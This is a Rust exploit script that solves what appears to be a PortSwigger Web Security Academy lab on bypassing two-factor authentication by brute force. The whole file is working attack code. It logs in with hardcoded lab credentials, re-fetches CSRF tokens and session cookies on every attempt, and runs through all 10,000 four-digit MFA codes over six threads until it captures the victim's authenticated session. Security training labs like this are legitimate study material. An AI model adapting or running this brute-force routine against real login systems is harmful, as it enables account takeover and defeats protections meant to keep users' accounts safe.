/************************************************************************
*
* Lab: 2FA bypass using a brute-force attack
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Get the session cookie and extract the csrf token
*      3. Login in as carlos
*      4. Get the new session
*      5. Fetch the login2 page
*      6. Extract the csrf token
*      7. Post the mfa-code
*      8. Repeat the process with all possbile numbers
*
*************************************************************************/
use lazy_static::lazy_static;
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io,
    io::Write,
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Arc, Mutex,
    },
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a49003003bc1b9083d9934900cd005b.web-security-academy.net";

lazy_static! {
    static ref CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref CARLOS_SESSION: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref CARLOS_SESSION_IS_FOUND: AtomicBool = AtomicBool::new(false);
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    let threads = 6; // You can experiment with the number of threads by adjusting this variable
    let ranges = build_code_ranges(0, 10000, threads);

    println!("⦗*⦘ Brute forcing the mfa-code of carlos..");

    ranges.par_iter().for_each(|range| {
        // Use every range in a different thread
        for code in range {
            let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
            if is_found {
                break;
            } else {
                if let Ok(login_page) = fetch("/login") {
                    let mut session = get_session_cookie(&login_page);
                    let mut csrf_token = get_csrf_token(login_page);

                    if let Ok(login_as_carlos) = login_as_carlos(&session, &csrf_token) {
                        session = get_session_cookie(&login_as_carlos);

                        if let Ok(login2_page) = fetch_with_session("/login2", &session) {
                            csrf_token = get_csrf_token(login2_page);

                            if let Ok(post_code) = post_mfa_code(&session, &csrf_token, code) {
                                if post_code.status().as_u16() == 302 {
                                    print_correct_code(code);

                                    let carlos_session = get_session_cookie(&post_code);
                                    CARLOS_SESSION.lock().unwrap().push_str(&carlos_session);
                                    CARLOS_SESSION_IS_FOUND.fetch_or(true, Ordering::Relaxed);
                                    break;
                                } else {
                                    print_progress(code);
                                }
                            } else {
                                print_failed_code(code);
                                continue;
                            }
                        } else {
                            print_failed_code(code);
                            continue;
                        }
                    } else {
                        print_failed_code(code);
                        continue;
                    }
                } else {
                    print_failed_code(code);
                    continue;
                }
            }
        }
    });

    let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
    if is_found {
        print!("\n⦗*⦘ Fetching carlos profile.. ");
        let carlos_session = CARLOS_SESSION.lock().unwrap();
        fetch_with_session("/my-account", &carlos_session)
            .expect("⦗!⦘ Failed to fetch carlos profile");
        println!("{}", "OK".green())
    } else {
        println!("⦗!⦘ Failed to get carlos session")
    }

    print_finish_message();
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Result<Response, Error> {
    WEB_CLIENT.get(format!("{LAB_URL}{path}")).send()
}

fn fetch_with_session(path: &str, session: &str) -> Result<Response, Error> {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
}

fn login_as_carlos(session: &str, csrf_token: &str) -> Result<Response, Error> {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("password", "montoya"),
            ("csrf", &csrf_token),
        ]))
        .send()
}

fn post_mfa_code(session: &str, csrf_token: &str, code: &i32) -> Result<Response, Error> {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login2"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("csrf", csrf_token),
            ("mfa-code", &&format!("{code:04}")),
        ]))
        .send()
}

fn build_code_ranges(start: i32, end: i32, threads: i32) -> Vec<Vec<i32>> {
    let chunk_size = (end - start) / threads;
    (start..end)
        .collect::<Vec<i32>>()
        .chunks(chunk_size as usize)
        .map(|x| x.to_owned())
        .collect::<Vec<Vec<i32>>>()
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn print_progress(code: &i32) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    print!(
        "\r❯❯ Elapsed: {} minutes || Trying ({}/10000) {} => {}",
        elapsed_time.yellow(),
        CODES_COUNTER.fetch_add(1, Ordering::Relaxed),
        format!("{code:04}").blue(),
        "Wrong".red()
    );
    io::stdout().flush().unwrap();
}

fn print_correct_code(code: &i32) {
    println!("\n🗹 Correct code: {}", format!("{code:04}").green());
}

fn print_failed_code(code: &i32) {
    println!(
        "\n⦗!⦘ Failed to post the code: {}",
        format!("{code:04}").red()
    )
}

fn print_finish_message() {
    let elapased_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    println!("🗹 Finished in: {} minutes", elapased_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}
